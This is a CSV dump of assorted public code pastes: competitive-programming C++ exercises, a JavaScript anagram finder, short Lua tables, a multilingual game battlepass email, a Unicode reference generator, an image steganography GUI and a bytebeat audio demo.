id,title,username,language,date,content
2rwP8YN3,Find Jumble Words Noice,akbarsahata,JavaScript,Friday 8th of March 2024 04:28:05 AM CDT,"function findJumbleWords(str = '') {
    const words = str.split(' ')

    const jumbleWords = new Set()

    for (let i = 0; i < words.length; i++) {
        if (words[i].length < 2) {
            continue;
        }

        for (let j = 0; j < words.length; j++) {
            if (i !== j) {
                let wordI = words[i].split('')
                let wordJ = words[j].split('')

                while (wordI.length > wordJ.length && j < words.length - 1) {
                    wordJ += words[j + 1]
                }

                for (let k = 0; k < wordI.length; k++) {
                    const letter = wordI[k];

                    const index = wordJ.indexOf(letter)

                    if (index === -1) break

                    if (k === wordI.length -1) {
                        jumbleWords.add(words[i])
                    }
                }
            }
        }
    }

    return Array.from(jumbleWords).join(' ')
}

const input = 'a gentleman and elegant man listen them silent';

console.log(findJumbleWords(input));"
jMqvjsUW,Untitled,Josif_tepe,C++,Friday 8th of March 2024 04:19:07 AM CDT,"#include <iostream>
#include <vector>
#include <string>
#include <map>
#include <algorithm>
using namespace std;
int n;
int a[33];
long long k;
bool check(long long x) {
    long long sum = 0;
    for(int i = 0; i < n; i++) {
        sum += x / a[i];
    }
    if(sum >= k) {
        return true;
    }
    return false;
}
    
int main()
{
    cin >> n >> k;
    for(int i = 0; i < n; i++) {
        cin >> a[i];
    }
    
    long long L = 0,R = 1e15;
    long long res = 1e18;
    
    while(L <= R) {
        long long mid = (L + R) / 2;
        if(check(mid)) {
            res = min(res, mid);
            R = mid - 1;
        }
        else {
            L = mid + 1;
        }
    }
    cout << res << endl;
    return 0;
}
// 1300 100 2000 45  50



"
cXr3ePT9,IDKFree,KingSlayer05,Lua,Friday 8th of March 2024 04:14:08 AM CDT,"return {
       ""DinosaurLordKing_K2"",
       ""DinosaurLordKing_K3"",       
}"
4Ya93G74,Untitled,Josif_tepe,C++,Friday 8th of March 2024 03:49:55 AM CDT,"#include <iostream>
#include <vector>
#include <string>
#include <map>
#include <algorithm>
using namespace std;

    
int main()
{
    int k, n;
    cin >> k >> n;
    vector<int> a(n);
    vector<int> b(n);
    for(int i = 0; i < n; i++) {
        cin >> a[i];
    }
    for(int i = 0; i < n; i++) {
        cin >> b[i];
    }
    sort(a.begin(), a.end());
    sort(b.begin(), b.end());
    long long res = 0;
    for(int i = 0; i < n; i++) {
        int diff = k - a[i];
        int idx = lower_bound(b.begin(), b.end(), diff) - b.begin();
        if(idx >= 0 and idx < n) {
            res += n - idx;
        }
    }
    cout << res << endl;
    return 0;
}
// 1300 100 2000 45  50



"
gs7GK1wV,IdkPAID,KingSlayer05,Lua,Friday 8th of March 2024 03:37:49 AM CDT,"return {
		""80.202.102.29""
}"
59DsV2d6,Ovo je vaš novi Battlepass na Grand RP-u!,Shpindlier,HTML,Friday 8th of March 2024 03:13:03 AM CDT,"<!DOCTYPE html>
<html><head><meta http-equiv=""content-type"" content=""text/html; charset=utf-8""></head><body>
	<div style=""background-color: #000;"">
		<table style=""box-sizing: border-box; background: #000; width: 600px; margin-left: auto; margin-right: auto; border-spacing: 0;"">
			<tbody>
				<tr>
					<td><a rel=""noopener noreferrer"" href=""https://gta5grand.com/?ref=2"" alt=""startimg1""><img src=""https://i.imgur.com/16rKcmn.png"" alt=""Logo"" class=""CToWUd a6T"" data-bit=""iit"" tabindex=""0""></a></td>
				</tr>
				<tr>
					<td align=""center"" style=""padding-top: 10px;"">
						<p style=""margin: 0; padding: 24px; color: #fff; width: 500px; font-family: 'Arial'; font-size: 19px; font-weight: 500; font-style: normal; letter-spacing: normal; line-height: normal; text-align: center;"">Update za prošlu nedelju će biti dopunjen. Uskoro ćete imati pristup novom Battlepass-u. Ne zaboravite da do kraja nedelje imate priliku da zaradite 15 GC igrajući samo 5 sati na našem serveru. Ne propustite!</p>
					</td>
				</tr>
				<tr>
					<td align=""center""><a rel=""noopener noreferrer"" style=""color: #fff; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; text-decoration-line: underline;"" href=""{{unsubscribe_url}}""><br>If you are not interested</a></td>
				</tr>
				<tr>
					<td>
						<div style=""padding-top: 0px; box-sizing: border-box;"">
							<p style=""color: #afafaf; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; padding: 15px 34px 0px 40px;"">By the way, I decided to let you know because you play on Grand Rp and registered there. If you're not interested, just let me know.</p>
						</div>
					</td>
				</tr>
			</tbody>
		</table>
	</div>
	</body></html>"
1CG0U5DQ,Untitled,Josif_tepe,C++,Friday 8th of March 2024 03:05:48 AM CDT,"#include <iostream>
#include <vector>
#include <string>
#include <map>
#include <algorithm>
using namespace std;

    
int main()
{
    int n;
    cin >> n;
    vector<int> v(n);
    
    for(int i = 0; i < n; i++) {
        cin >> v[i];
    }
    sort(v.begin(), v.end());
    for(int j = 0; j < 5; j++) {
        int x;
        cin >> x;
        
        int idx = lower_bound(v.begin(), v.end(), x) - v.begin();
        if(idx == n) {
            cout << ""BROJOT NE POSTOI\n"" << endl;
        }
        else {
            cout << idx << "" "" << v[idx] << endl;
        }
    }
    return 0;
}
// 1300 100 2000 45  50
"
Ly1MuQzK,Untitled,Josif_tepe,C++,Friday 8th of March 2024 02:55:26 AM CDT,"#include <iostream>
#include <vector>
#include <string>
#include <map>
#include <algorithm>
using namespace std;

    
int main()
{
    int n;
    cin >> n;
    vector<int> v(n);
    
    for(int i = 0; i < n; i++) {
        cin >> v[i];
    }
    sort(v.begin(), v.end());
    int x;
    cin >> x;
    
    int L = 0, R = n - 1;
    while(L <= R) {
        cout << ""L="" << L<<"", R="" << R << endl;
        int mid = (L + R) / 2;
        if(x == v[mid]) {
            cout << ""Brojot postoi i se naoga tuka: "" << mid << endl;
            break;
        }
        else if(x < v[mid]) {
            R = mid - 1;
        }
        else {
            L = mid + 1;
        }
    }
    return 0;
}
// 1300 100 2000 45  50
"
p4Yj4eE8,Der neue Battlepass auf GrandRP!,Shpindlier,HTML,Friday 8th of March 2024 02:53:55 AM CDT,"<!DOCTYPE html>
<html><head><meta http-equiv=""content-type"" content=""text/html; charset=utf-8""></head><body>
	<div style=""background-color: #000;"">
		<table style=""box-sizing: border-box; background: #000; width: 600px; margin-left: auto; margin-right: auto; border-spacing: 0;"">
			<tbody>
				<tr>
					<td><a rel=""noopener noreferrer"" href=""https://gta5grand.com/?ref=2"" alt=""startimg1""><img src=""https://i.imgur.com/16rKcmn.png"" alt=""Logo"" class=""CToWUd a6T"" data-bit=""iit"" tabindex=""0""></a></td>
				</tr>
				<tr>
					<td align=""center"" style=""padding-top: 10px;"">
						<p style=""margin: 0; padding: 24px; color: #fff; width: 500px; font-family: 'Arial'; font-size: 19px; font-weight: 500; font-style: normal; letter-spacing: normal; line-height: normal; text-align: center;"">Die Veröffentlichung von letzter Woche wird ergänzt. Bald erhaltet Ihr Zugriff auf den neuen Battlepass. Vergesst nicht, dass bis zum Ende der Woche die Möglichkeit besteht 15 GC zu erhalten, indem Ihr nur 5 Stunden auf unserem Server spielt. Lasst euch das nicht entgehen!</p>
					</td>
				</tr>
				<tr>
					<td align=""center""><a rel=""noopener noreferrer"" style=""color: #fff; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; text-decoration-line: underline;"" href=""{{unsubscribe_url}}""><br>If you are not interested</a></td>
				</tr>
				<tr>
					<td>
						<div style=""padding-top: 0px; box-sizing: border-box;"">
							<p style=""color: #afafaf; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; padding: 15px 34px 0px 40px;"">By the way, I decided to let you know because you play on Grand Rp and registered there. If you're not interested, just let me know.</p>
						</div>
					</td>
				</tr>
			</tbody>
		</table>
	</div>
	</body></html>"
D2MZ5EMT,all_utf8_symbols,Python253,Python,Friday 8th of March 2024 02:51:09 AM CDT,"#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
# Filename: all_utf8_symbols.py
# Author: Jeoi Reqi

""""""
Full UTF-8 Symbols & Site Generator Script

This Python script creates an index page for a comprehensive UTF-8 symbol HTML reference, covering the entire Unicode range of 1,114,112 characters.
The index organizes these characters into pages, with each page containing 10,000 characters broken down into stylized tables displaying 100 characters at a time.

Requirements:
- Python 3
- Web Browser

Usage:
1. Ensure you have Python 3 installed on your system.
2. Run this script to generate the UTF-8 symbol HTML reference.
3. When prompted, choose whether to save the archive of symbols in groups of 10,000 per text file.
4. After all files have saved, open `index.html` in a web browser.
5. Keep the saved HTML files in the same folder as the index file.

Note:
- If chosen, individual TXT files for each range will be saved in the 'Archive' folder.
- The output HTML menu will be saved to `index.html`.
- All HTML files for the pages will be saved in the current working directory.
- Ensure an active internet connection for the script to fetch the necessary styles and fonts.
""""""

# IMPORTS
import os

# Function to create the individual pages
def generate_html_page(start, end, filename):
    """"""
    Generate an HTML page with stylized tables for a specified Unicode range.

    Parameters:
    - start (int): The starting Unicode code point of the range.
    - end (int): The ending Unicode code point of the range.
    - filename (str): The name of the HTML file to be generated.

    Returns:
    None
    """"""
    # Open the HTML file for writing
    with open(filename, ""w"", encoding=""utf-8"") as html_file:
        # Write the HTML header with metadata and styles
        html_file.write(f""<!DOCTYPE html>\n<html xmlns=\""http://www.w3.org/1999/xhtml\"">\n<head>""
                        f""<meta content=\""text/html; charset=utf-8\"" http-equiv=\""Content-Type\""/>""
                        f""<title>UTF-8 Symbols - Range {start}-{end}</title>""
                        f""<link rel=\""stylesheet\"" href=\""https://fonts.googleapis.com/css2?family=Amatic+SC:wght@700&display=swap\"">""
                        f""<style>""
                        f""body {{ font-family: 'Arial', sans-serif; background: linear-gradient(90deg, #000000 0%, #111e3a 100%); color: #808080; }}""
                        f""h1, h2 {{ font-family: 'Amatic SC', cursive; text-align: center; }}""
                        f""h1 {{ font-size: 90px; color: #336699; }}""
                        f""h2 {{ font-size: 30px; color: #808080; }}""
                        f""table {{ border-collapse: collapse; width: 100%; }}""
                        f""table, th, td {{ border: 1px solid #ddd; padding: 12px; }}""
                        f""th {{ background-color: #333333; color: #336699; font-size: 24px; }}""
                        f""details {{ margin-bottom: 10px; }}""
                        f""summary {{ cursor: pointer; color: #808080; font-size: 30px; font-family: 'Amatic SC', cursive; font-weight: bold; }}""
                        f""footer {{ text-align: center; margin-top: 40px; color: #808080; font-size: 20px; font-family: 'Amatic SC', cursive; font-weight: bold; }}""
                        f""</style>""
                        f""</head>\n<body>\n\t<h1>UTF-8 Symbols - Range {start}-{end}</h1>""
                        f""\t<h2>SELECT YOUR RANGE BELOW:</h2>""
                        f""\t<h2>⮛ ⮛ ⮛ ⮛ ⮛</h2>\n"")

        # Loop through each symbol code in the specified range
        sym_code = start
        while sym_code <= end:
            # Check if the current symbol code is a multiple of 100 (for table organization)
            modZero = sym_code % 100
            if modZero == 0:
                range_id = f""range_{sym_code}_{sym_code + 99}""
                unicode_range = f""U+{sym_code:04X} - U+{sym_code + 99:04X}""
                hex_range = f""{sym_code:X} - {sym_code + 99:X}""
                # Write the details section with Unicode and Hex range in the summary
                html_file.write(f""\n<details>\n\t<summary style='font-family: \""Amatic SC\"", cursive; font-weight: bold; font-size: 36px; color: #336699;'>{sym_code}-{sym_code + 99} (Uni: {unicode_range} / Hex: {hex_range})</summary>\n"")
                # Write the table header
                html_file.write(f""\t<table>\n\t\t<tr>\n\t\t\t<th style='font-family: \""Amatic SC\"", cursive; font-weight: bold; font-size: 30px; color: #336699;'>Unicode</th>\n""
                                f""\t\t\t<th style='font-family: \""Amatic SC\"", cursive; font-weight: bold; font-size: 30px; color: #336699;'>Hex</th>\n""
                                f""\t\t\t<th style='font-family: \""Amatic SC\"", cursive; font-weight: bold; font-size: 30px; color: #336699;'>Symbol</th>\n\t\t</tr>\n\n"")

            # Write each symbol entry in the table
            unicode_str = f""U+{sym_code:04X}""
            html_file.write(f""\t\t<tr>\n\t\t\t<td style='color: yellow; font-size: 24px;'>{unicode_str}</td>\n""
                            f""\t\t\t<td style='color: red; font-size: 24px;'>{sym_code:X}</td>\n""
                            f""\t\t\t<td style='color: #808080; font-size: 24px;'>&#x{sym_code:X};</td>\n""
                            f""\t\t</tr>\n\n"")

            # Check if the current symbol code is the last in the 100 block
            modFF = sym_code % 100
            if modFF == 99:
                # Close the table and details section
                html_file.write(""\t</table>\n</details>\n"")

            # Move to the next symbol code
            sym_code += 1

        # Write the footer with script information
        html_file.write(""\n\t<footer>\n""
                        ""\t\t<p>Generated by utf8_symbols.py</p>\n""
                        ""\t\t<p>Author: Jeoi Reqi</p>\n""
                        ""\t</footer>\n"")

        # Close the HTML file
        html_file.write(""\n\t</body></html>\n"")

# Function to create the index page
def generate_index_page(ranges, ranges_per_row):
    """"""
    Generate an index HTML page with links to individual range pages.

    Parameters:
    - ranges (list): A list of tuples representing Unicode ranges.
    - ranges_per_row (int): The number of ranges to display per row in the index.

    Returns:
    None
    """"""
    # Open the index HTML file for writing
    with open(""index.html"", ""w"", encoding=""utf-8"") as index_file:
        # Write the HTML header with metadata and styles
        index_file.write(f""<!DOCTYPE html>\n<html xmlns=\""http://www.w3.org/1999/xhtml\"">\n<head>""
                         f""<meta content=\""text/html; charset=utf-8\"" http-equiv=\""Content-Type\""/>""
                         f""<title>UTF-8 Symbols - Index</title>""
                         f""<link rel=\""stylesheet\"" href=\""https://fonts.googleapis.com/css2?family=Amatic+SC:wght@700&display=swap\"">""
                         f""<style>""
                         f""body {{ font-family: 'Arial', sans-serif; background: linear-gradient(90deg, #000000 0%, #111e3a 100%); color: #808080; }}""
                         f""h1, h2 {{ font-family: 'Amatic SC', cursive; text-align: center; }}""
                         f""h1 {{ font-size: 90px; color: #336699; }}""
                         f""h2 {{ font-size: 30px; color: #808080; }}""
                         f""#grid-container {{ display: grid; grid-template-columns: repeat({ranges_per_row}, 1fr); grid-gap: 20px; }}""
                         f"".grid-cell {{ text-align: center; padding: 20px; border: 1px solid #ddd; }}""
                         f""a {{ color: #336699; text-decoration: none; }}""
                         f""footer {{ text-align: center; margin-top: 40px; color: #808080; font-size: 20px; font-family: 'Amatic SC', cursive; font-weight: bold; }}""
                         f""</style>""
                         f""</head>\n<body>\n\t<h1>UTF-8 Symbols - Index</h1>""
                         f""\t<h2>SELECT YOUR RANGE BELOW:</h2>\n""
                         f""\t<h2>⮛ ⮛ ⮛ ⮛ ⮛</h2>\n""
                         f""\t<div id=\""grid-container\"">\n"")

        # Write links to individual range pages in a grid layout
        for start, end, filename in ranges:
            index_file.write(f""\t\t<div class=\""grid-cell\""><a href=\""{filename}\"">{start}-{end}</a></div>\n"")

        # Close the grid container
        index_file.write(""\n\t</div>"")
        
        # Add extra blank lines after the footer for padding
        index_file.write(""\n\t<br />\n\t<br />\n\t<br />\n\t<br />\n"")

        # Write the footer with script information
        index_file.write(""\n\t<footer>\n""
                         ""\t\t<p>Generated by utf8_symbols.py</p>\n""
                         ""\t\t<p>Author: Jeoi Reqi</p>\n""
                         ""\t</footer>\n"")

        # Close the HTML file
        index_file.write(""\n\t</body></html>\n"")

# Function to write Unicode symbols to a file with header
def write_unicode_to_file(file_name, start, end):
    with open(file_name, 'w', encoding='utf-8', errors='replace') as file:
        # Write header to the file
        file.write(""\n------------------------\nUNICODE \t\t SYMBOL \n------------------------\n"")
        
        # Write Unicode symbols and corresponding strings
        for code_point in range(start, end + 1):
            unicode_str = f'U+{code_point:04X}'
            try:
                symbol_str = chr(code_point)
            except ValueError:
                # Handle surrogate pairs explicitly
                high_surrogate = 0xD800 + ((code_point - 0x10000) >> 10)
                low_surrogate = 0xDC00 + ((code_point - 0x10000) & 0x3FF)
                symbol_str = f'{chr(high_surrogate)}{chr(low_surrogate)}'

            
            file.write(f'{unicode_str}\t\t\t\t{symbol_str}\t\n------------------------\n')
            


# Function to create a folder called Archive & Save the data to file.
def write_unicode_to_txt(start, end, ranges, chars_per_file):
    """"""
    Write Unicode values, hex values, and symbols to TXT files in groups of chars_per_file.

    Parameters:
    - start (int): The starting Unicode code point of the entire range.
    - end (int): The ending Unicode code point of the entire range.
    - ranges (list): A list of tuples representing Unicode ranges.
    - chars_per_file (int): Number of characters per TXT file.

    Returns:
    None
    """"""
    choice = input(""\nDo you want to save the full archive?\n1: YES\n2: NO\nWhat is your choice: (1 Or 2)?\n"")

    full_archive = choice == '1'

    if full_archive:
        print(""Saving The Archive May Take Some Time To Complete..."")
        # Create 'Archive' folder in the current working directory
        archive_folder = os.path.join(os.getcwd(), 'Archive')
        os.makedirs(archive_folder, exist_ok=True)

        for start_range, end_range, _ in ranges:
            archive_filename = os.path.join(archive_folder, f""archive_{start_range:06X}_{end_range:06X}.txt"")

            # Call the function to write Unicode symbols to file
            write_unicode_to_file(archive_filename, start_range, end_range)

            # Archive File Creation Notifications
            print(f""Output Archive File {archive_filename} Completed!"")

# Define the total number of characters in the Unicode range
total_chars = 1114112

# Define the number of characters per page
chars_per_page = 10000

# Define the number of characters per file
chars_per_file = 10000

# Calculate the number of pages needed
num_pages = total_chars // chars_per_page

# Define the number of ranges to display per row in the index
ranges_per_row = 5

# Generate a list of ranges for each page
ranges = [(i * chars_per_page, (i + 1) * chars_per_page - 1, f""utf8_symbols_{i * chars_per_page}_{(i + 1) * chars_per_page - 1}.html"") for i in range(num_pages)]

# Generate Unicode TXT files
write_unicode_to_txt(0, total_chars - 1, ranges, chars_per_page)

# Generate HTML pages for each range
for start, end, filename in ranges:
    generate_html_page(start, end, filename)

# Generate the main index page
generate_index_page(ranges, ranges_per_row)

# Archive File Creation Completion Notification
print(f""\nAll Archive Files Completed & Saved In The Archive Folder\n"")

# Script & File Creation Completion Notification
print(""\nOutput Saved To index.html & Individual HTML Files For Each Range.\n"")

"
X5wLyiqv,This is your new Battlepass on Grand RP!,Shpindlier,HTML,Friday 8th of March 2024 02:50:28 AM CDT,"<!DOCTYPE html>
<html><head><meta http-equiv=""content-type"" content=""text/html; charset=utf-8""></head><body>
	<div style=""background-color: #000;"">
		<table style=""box-sizing: border-box; background: #000; width: 600px; margin-left: auto; margin-right: auto; border-spacing: 0;"">
			<tbody>
				<tr>
					<td><a rel=""noopener noreferrer"" href=""https://gta5grand.com/?ref=2"" alt=""startimg1""><img src=""https://i.imgur.com/16rKcmn.png"" alt=""Logo"" class=""CToWUd a6T"" data-bit=""iit"" tabindex=""0""></a></td>
				</tr>
				<tr>
					<td align=""center"" style=""padding-top: 10px;"">
						<p style=""margin: 0; padding: 24px; color: #fff; width: 500px; font-family: 'Arial'; font-size: 19px; font-weight: 500; font-style: normal; letter-spacing: normal; line-height: normal; text-align: center;"">Last week’s update is not everything. You will soon have access to the new Battlepass. Don't forget that until the end of the week, you have the opportunity to earn 15 GC by playing just 5 hours on our server. Don't miss out!</p>
					</td>
				</tr>
				<tr>
					<td align=""center""><a rel=""noopener noreferrer"" style=""color: #fff; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; text-decoration-line: underline;"" href=""{{unsubscribe_url}}""><br>If you are not interested</a></td>
				</tr>
				<tr>
					<td>
						<div style=""padding-top: 0px; box-sizing: border-box;"">
							<p style=""color: #afafaf; font-family: 'Arial'; font-size: 16px; letter-spacing: 0.01em; padding: 15px 34px 0px 40px;"">By the way, I decided to let you know because you play on Grand Rp and registered there. If you're not interested, just let me know.</p>
						</div>
					</td>
				</tr>
			</tbody>
		</table>
	</div>
	</body></html>"
Zc9ekzYH,STEGANO-VIWE-IMAGE.py,Najeebsk,Python,Friday 8th of March 2024 02:49:51 AM CDT,"import os
import numpy as np
from imageio.v2 import imread, imwrite
import tkinter as tk
from PIL import Image, ImageTk
import subprocess

max_value = 255  # max uint value per pixel per channel
header_len = 4 * 8  # uint32 bit length

def read_image(img_path):
    img = np.array(imread(img_path), dtype=np.uint8)
    orig_shape = img.shape
    return img.flatten(), orig_shape

def write_image(img_path, img_data, shape):
    img_data = np.reshape(img_data, shape)
    imwrite(img_path, img_data)

def bytes2array(byte_data):
    byte_array = np.frombuffer(byte_data, dtype=np.uint8)
    return np.unpackbits(byte_array)

def array2bytes(bit_array):
    byte_array = np.packbits(bit_array)
    return byte_array.tobytes()

def read_file(file_path):
    file_bytes = open(file_path, ""rb"").read()
    return bytes2array(file_bytes)

def write_file(file_path, file_bit_array):
    bytes_data = array2bytes(file_bit_array)
    with open(file_path, 'wb') as f:
        f.write(bytes_data)

def encode_data(image, file_data):
    or_mask = file_data
    and_mask = np.zeros_like(or_mask)
    and_mask = (and_mask + max_value - 1) + or_mask 
    res = np.bitwise_or(image, or_mask)
    res = np.bitwise_and(res, and_mask)
    return res

def decode_data(encoded_data):
    out_mask = np.ones_like(encoded_data)
    output = np.bitwise_and(encoded_data, out_mask)
    return output

def hide_images():
    original_file = original_entry_hide.get()
    hide_file = hide_entry_hide.get()
    save_file = save_entry_hide.get()
    img_path = f'DEEPFAKE/{original_file}.jpg'
    file_path = f'DEEPFAKE/{hide_file}.jpg'
    output_path = f'DATA/{save_file}.png'

    if not os.path.isfile(img_path):
        print(""Image file does not exist"")
        return
    if not os.path.isfile(file_path):
        print(""File does not exist"")
        return

    image, shape_orig = read_image(img_path)
    file = read_file(file_path)
    file_len = file.shape[0]
    len_array = np.array([file_len], dtype=np.uint32).view(np.uint8)
    len_array = np.unpackbits(len_array)
    img_len = image.shape[0]

    if file_len >= img_len - header_len:
        print(""File too big, error"")
        return
    else:
        tmp = file
        file = np.random.randint(2, size=img_len, dtype=np.uint8)
        file[header_len:header_len+file_len] = tmp

    file[:header_len] = len_array
    encoded_data = encode_data(image, file)

    write_image(output_path, encoded_data, shape_orig)
    print(""Image encoded"")

    preview_img = Image.fromarray(encoded_data.reshape(shape_orig))
    photo = ImageTk.PhotoImage(preview_img)
    lbl.config(image=photo)
    lbl.image = photo

def unhide_images():
    original_file = original_entry_unhide.get()
    save_file = save_entry_unhide.get()
    img_path = f'DATA/{original_file}.png'
    if not os.path.isfile(img_path):
        print(""Image file does not exist"")
        return

    encoded_data, shape_orig = read_image(img_path)
    data = decode_data(encoded_data)
    el_array = np.packbits(data[:header_len])
    extracted_len = el_array.view(np.uint32)[0]
    data = data[header_len:extracted_len+header_len]
    write_file(f'DATA/{save_file}.jpg', data)
    print(""Image decoded and saved"")

    saved_image_path = f'DATA/{save_file}.jpg'
    #subprocess.Popen(['start', saved_image_path], shell=True)

    # Load the saved image for display in Frame2
    saved_image = Image.open(saved_image_path)
    #saved_image.thumbnail((shape_orig[0] // 3, shape_orig[1]))  # Resize if needed
    photo = ImageTk.PhotoImage(saved_image)
    lbl2.config(image=photo)
    lbl2.image = photo


root = tk.Tk()
root.geometry(""1000x660"")
root.title(""Hide and Unhide Images"")

# Frame for Original Image
f = tk.Frame(root, bd=3, bg=""#2c3e50"", width=500, height=630, relief=tk.GROOVE)
f.place(x=5, y=10)

tk.Label(f, text=""Open Original Image:"").place(x=10, y=10)
original_entry_hide = tk.Entry(f)
original_entry_hide.place(x=150, y=10)

tk.Label(f, text=""Open Image to Hide:"").place(x=10, y=40)
hide_entry_hide = tk.Entry(f)
hide_entry_hide.place(x=150, y=40)

tk.Label(f, text=""Save Hidden Image:"").place(x=10, y=70)
save_entry_hide = tk.Entry(f)
save_entry_hide.place(x=150, y=70)

hide_button = tk.Button(f, text=""Hide"", command=hide_images)
hide_button.place(x=150, y=100)

lbl = tk.Label(f, bg=""#2c3e50"")
lbl.place(x=10, y=140)

# Frame for Unhidden Image
frame2 = tk.Frame(root, bd=3, width=500, height=630, relief=tk.GROOVE, bg=""#34495e"")
frame2.place(x=505, y=10)

tk.Label(frame2, text=""Open Encoded Image:"").place(x=10, y=10)
original_entry_unhide = tk.Entry(frame2)
original_entry_unhide.place(x=150, y=10)

tk.Label(frame2, text=""Save Unhidden Image:"").place(x=10, y=40)
save_entry_unhide = tk.Entry(frame2)
save_entry_unhide.place(x=150, y=40)

unhide_button = tk.Button(frame2, text=""Unhide"", command=unhide_images)
unhide_button.place(x=150, y=70)

lbl2 = tk.Label(frame2, bg=""#34495e"")
lbl2.place(x=10, y=100)


root.mainloop()
"
yFN0m1pA,Untitled,Josif_tepe,C++,Friday 8th of March 2024 02:31:21 AM CDT,"#include <iostream>
#include <vector>
#include <string>
#include <map>
#include <algorithm>
using namespace std;

    
int main()
{
    int n, k;
    cin >> n >> k;
    vector<int> org(n);
    vector<pair<int, int>> v;
    
    for(int i = 0; i < n; i++) {
        cin >> org[i];
        v.push_back(make_pair(org[i], i));
    }
    sort(v.begin(), v.end());
  
    for(int i = 0; i < k; i++) {
        swap(org[v[i].second], org[v[n - i - 1].second]);
    }
    for(int i = 0; i < n; i++) {
        cout << org[i] << "" "";
    }
    
    return 0;
}
// 1300 100 2000 45  50
"
ye7wVcpS,using kit_w32 audio callbacks,Kitomas,C++,Friday 8th of March 2024 02:15:51 AM CDT,"#include <kit/audio.hpp>

using namespace kit;


#define FORMULA t*(42&t>>10) //the elusive 42 melody~
#define TARGET_SAMPLE_RATE 8000
u64 _t = KIT_U64_MAX;

s32 audio_callback(const void* _input, void* _output,
                   const AudioStreamInfo* info, void* userdata)
{
  (void)_input;
  u8* output = (u8*)_output;

  u32 numSamples = info->sampleFrames;
  f64 sampleRate = info->sampleRate;
  f64 rateRatio  = (f64)TARGET_SAMPLE_RATE/sampleRate;


  for(u32 i=0; i<numSamples; ++i){
    u64 t = (u64)((++_t)*rateRatio);
    output[i] = (u8)( FORMULA );
  }

  return ASTREAM_RTN_CONTINUE;
}




int main(int argc, char** argv){

  AudioStreamParams params;
  params.callback       = audio_callback;
  params.outputDeviceID = audio::getDefOutputDevice();
  params.outputFormat   = ASTREAM_FMT_U8;
  params.outputChannels = 1;

  AudioStream stream(&params);

  stream.start();
  time::sleep(8300); //plays 1 loop of 42 melody bytebeat
  stream.stop();

  return 0;
}
"
